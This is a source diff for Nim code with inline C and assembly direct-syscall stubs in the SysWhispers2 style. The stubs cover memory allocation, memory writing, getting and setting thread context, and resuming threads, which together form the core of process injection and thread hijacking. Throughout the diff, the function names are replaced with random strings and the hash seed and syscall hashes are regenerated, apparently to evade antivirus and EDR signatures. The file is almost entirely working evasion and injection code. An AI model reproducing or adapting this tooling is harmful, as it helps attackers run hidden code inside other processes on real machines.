@@ -1,3 +1,5 @@
+import winim/inc/windef
+
 {.passC:"-masm=intel".}
 
 {.emit: """
@@ -11,7 +13,7 @@
 
 #include <Windows.h>
 
-#define SW2_SEED 0xB87BBBEA
+#define SW2_SEED 0xEEBDBFCC
 #define SW2_ROL8(v) (v << 8 | v >> 24)
 #define SW2_ROR8(v) (v >> 8 | v << 24)
 #define SW2_ROX8(v) ((SW2_SEED % 2) ? SW2_ROL8(v) : SW2_ROR8(v))
@@ -181,17 +183,22 @@ EXTERN_C DWORD SW2_GetSyscallNumber(DWORD FunctionHash)
 
 """.}
 
+# NtAllocateVirtualMemory -> CbZGEMmsvlfsZxPo
+# NtWriteVirtualMemory -> nVcnEsSyWXtfrjav
+# NtGetContextThread -> VzpSdkMDEGHOzTpB
+# NtSetContextThread -> IGyhziwCULdezDSq
+# NtResumeThread -> mAcJDfMgbUNFgsxu
 
 
 
-proc NtAllocateVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
+proc CbZGEMmsvlfsZxPo*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
 	mov [rsp+24], r8
 	mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x0355523BB
+	mov ecx, 0x0A50FA99B
 	call SW2_GetSyscallNumber  
 	add rsp, 0x28
 	mov rcx, [rsp +8]          
@@ -203,14 +210,14 @@ proc NtAllocateVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBit
 	ret
     """
 
-proc NtWriteVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
+proc nVcnEsSyWXtfrjav*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
 	mov [rsp+24], r8
 	mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x07DE16773
+	mov ecx, 0x0B135979B
 	call SW2_GetSyscallNumber  
 	add rsp, 0x28
 	mov rcx, [rsp +8]          
@@ -222,14 +229,14 @@ proc NtWriteVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PV
 	ret
     """
 
-proc NtGetContextThread*(ThreadHandle: HANDLE, ThreadContext: PCONTEXT): NTSTATUS {.asmNoStackFrame.} =
+proc VzpSdkMDEGHOzTpB*(ThreadHandle: HANDLE, ThreadContext: PCONTEXT): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
 	mov [rsp+24], r8
 	mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x002A10A15
+	mov ecx, 0x0744FB6E9
 	call SW2_GetSyscallNumber  
 	add rsp, 0x28
 	mov rcx, [rsp +8]          
@@ -241,14 +248,14 @@ proc NtGetContextThread*(ThreadHandle: HANDLE, ThreadContext: PCONTEXT): NTSTATU
 	ret
     """
 
-proc NtSetContextThread*(ThreadHandle: HANDLE, Context: PCONTEXT): NTSTATUS {.asmNoStackFrame.} =
+proc IGyhziwCULdezDSq*(ThreadHandle: HANDLE, Context: PCONTEXT): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
 	mov [rsp+24], r8
 	mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x014C08EF9
+	mov ecx, 0x014806E39
 	call SW2_GetSyscallNumber  
 	add rsp, 0x28
 	mov rcx, [rsp +8]          
@@ -260,14 +267,14 @@ proc NtSetContextThread*(ThreadHandle: HANDLE, Context: PCONTEXT): NTSTATUS {.as
 	ret
     """
 
-proc NtResumeThread*(ThreadHandle: HANDLE, PreviousSuspendCount: PULONG): NTSTATUS {.asmNoStackFrame.} =
+proc mAcJDfMgbUNFgsxu*(ThreadHandle: HANDLE, PreviousSuspendCount: PULONG): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
 	mov [rsp+24], r8
 	mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x07ADD7477
+	mov ecx, 0x01B3D5794
 	call SW2_GetSyscallNumber  
 	add rsp, 0x28
 	mov rcx, [rsp +8]          
